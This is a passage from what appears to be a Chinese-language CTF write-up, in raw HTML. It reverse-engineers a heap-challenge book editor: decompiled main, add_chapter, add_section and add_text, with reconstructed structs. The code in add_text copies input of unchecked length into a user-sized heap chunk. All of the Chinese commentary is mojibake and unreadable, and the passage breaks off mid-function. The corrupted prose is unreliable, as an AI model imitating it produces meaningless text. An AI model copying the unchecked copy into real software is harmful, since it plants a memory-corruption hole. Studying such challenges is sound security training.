class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">sub_C1A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_D97</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"book name: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> off_2554 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">add_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">add_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">remove_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token function">remove_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>        <span class="token function">remove_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7u</span><span class="token punctuation">:</span>        <span class="token function">preview</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8u</span><span class="token punctuation">:</span>        <span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9u</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ç¨‹åºä¸€å¼€å§‹åˆ†é…ä¸€ä¸ª0x80çš„chunkï¼Œç„¶åå¾€chunkä¸­è¯»å…¥booknameï¼Œæ¥ç€æ˜¯ç»å…¸çš„switchè¯­å¥ï¼Œå…«ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¾æ¬¡æ¥åˆ†æ</p><h4 id="1-add-chapter"><a href="#1-add-chapter" class="headerlink" title="1.add_chapter()"></a>1.add_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">add_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>add_chapter</strong>åŠŸèƒ½æ¥å—çš„å‚æ•°ä¸ºmainå‡½æ•°ä¸­åˆ†é…çš„0x80å¤§å°chunkçš„æŒ‡é’ˆï¼Œä¸ºæ–¹ä¾¿ï¼Œåé¢ç»Ÿç§°ä¸ºbook_chunk</p><p>ç¨‹åºé€šè¿‡forå¾ªç¯ï¼Œä»¥<strong>*(a1 + 8 * (i + 4LL))</strong>éå†book_chunkï¼Œåˆå§‹ä¸º<strong>*(a1 +0x20)</strong>ï¼Œå¦‚æœ<strong>*(a1 + 8 * (i + 4LL))</strong>ä¸ºç©ºï¼Œåˆ™åˆ†é…ä¸€ä¸ª0x80çš„chunkï¼ŒæŒ‡é’ˆæ”¾å…¥è¯¥ä½ç½®ï¼Œç„¶åé€šè¿‡è¿™ä¸ªæŒ‡é’ˆå¾€å¯¹åº”chunkå†™å…¥æ•°æ®ã€‚æ ¹æ®è¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å°±èƒ½å†™å‡ºbook_chunkçš„ç»“æ„ä½“äº†ï¼Œå¦‚ä¸‹</p><pre><code>struct book{    char name[32];    char *chapter[12];}</code></pre><h4 id="2-add-section"><a href="#2-add-section" class="headerlink" title="2.add_section()"></a>2.add_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-40h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-18h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich chapter do you want to add into:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%p"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>add_section()æ¥æ”¶çš„å‚æ•°ä¹Ÿä¸ºbook_chunkï¼Œå®é™…ä¸Šï¼Œå…«ä¸ªåŠŸèƒ½æ¥æ”¶çš„å‚æ•°éƒ½ä¸ºbook_chunkã€‚å‡½æ•°é¦–å…ˆè¦æ±‚è¾“å…¥chapternameï¼Œç„¶åè¿›å…¥forå¾ªç¯ï¼Œä¸€å…±æœ‰ä¸¤ä¸ªforå¾ªç¯ï¼Œç¬¬ä¸€ä¸ªforå¾ªç¯éå†book_chunkï¼Œç„¶åä¾æ¬¡å¯¹æ¯”æ¯ä¸ªchapternameå’Œæˆ‘ä»¬è¾“å…¥çš„chapternameæ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è¿›å…¥ä¸‹ä¸€å±‚å¾ªç¯ï¼Œ<strong>v1 = *(a1 + 8 * (i + 4LL))</strong>ï¼Œv1åˆ™è¢«èµ‹å€¼ä¸ºå¯¹åº”çš„chapterchunkæŒ‡é’ˆã€‚</p><p>è¿›å…¥ä¸‹ä¸€å±‚å¾ªç¯åï¼Œå·²ä¹…ä¼šç”¨ä¸Šä¸€å±‚å¾ªç¯çš„åˆ¤æ–­æ–¹å¼ï¼Œ<strong><em>(\</em>(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL))</strong>,æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸€ä¸²æŒ‡é’ˆçš„æ„æ€ï¼Œç¬¬ä¸€éƒ¨åˆ†<strong>*(a1 + 8 * (i + 4LL))</strong>ï¼Œè¿™å…¶å®å°±æ˜¯v1ï¼ŒåŸå¼å¯ä»¥åŒ–ç®€ä¸º<strong>*(v1 + 8 * (j + 4LL))</strong>ï¼Œv1æŒ‡å‘chapterchunkï¼Œæ‰€ä»¥<strong>*(v1 + 8 * (j + 4LL))</strong>çš„æœ€å°å€¼ä¸º<strong>*(v1 +0x20)</strong>ã€‚å¦‚æœ<strong>*(v1 + 8 * (j + 4LL))</strong>æ²¡æœ‰å€¼ï¼Œé‚£ä¹ˆåˆ†é…ä¸€ä¸ª0x30çš„chunkï¼Œå°†æŒ‡é’ˆå­˜å…¥å…¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿèƒ½å†™å‡ºchapterçš„ç»“æ„ä½“ï¼Œå¦‚ä¸‹</p><pre><code>struct chapter{    char name[32];    char* section[10];}</code></pre><p>ç„¶åæ‰“å°å‡ºæˆ‘ä»¬ç”³è¯·çš„sectionchunkçš„åœ°å€ï¼Œå¾€sectionchunkè¯»å…¥æ•°æ®ï¼Œå¹¶å°†sectionchunk+40çš„ä½ç½®å†™å…¥32ã€‚</p><h4 id="3-add-text"><a href="#3-add-text" class="headerlink" title="3.add_text()"></a>3.add_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-14Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-148h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-144h]</span>  <span class="token keyword">char</span> s2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-140h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-120h]</span>  <span class="token keyword">unsigned</span> __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+148h] [rbp-18h]</span>  v10 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich section do you want to add into:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>off_18 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>LABEL_12<span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHow many chapters you want to write:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">256</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nText:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nToo many"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v10<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªç¨‹åºé€šè¿‡æˆ‘ä»¬è¾“å…¥çš„sectionnameæ¥å®šä½sectionchunkï¼Œå’Œä¸Šä¸€ä¸ªåŠŸèƒ½çš„å®šä½æ–¹å¼ä¸€æ ·ã€‚</p><p>å®šä½äº†sectionä¹‹åï¼Œé¦–å…ˆè¾“å…¥textsizeï¼Œç„¶ååˆ†é…ä¸€ä¸ªtextsizeå¤§å°çš„chunkï¼Œå¹¶å°†æŒ‡é’ˆå­˜å…¥sectionchunk+32çš„ä½ç½®å¤„ï¼Œæ¥ç€å¾€tæ ˆä¸­çš„ä¸€ä¸ªå˜é‡så†™å…¥æ•°æ®ï¼Œç„¶åå°†å†™å…¥sçš„æ•°æ®å¤åˆ¶åˆ°textchunkï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿèƒ½å†™å‡ºsectionçš„ç»“æ„ä½“ï¼Œå¦‚ä¸‹</p><pre><code>struct section{    char name[32];    char* text;}</code></pre><h4 id="4-remove-text"><a href="#4-remove-text" class="headerlink" title="4.remove_text()"></a>4.remove_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> 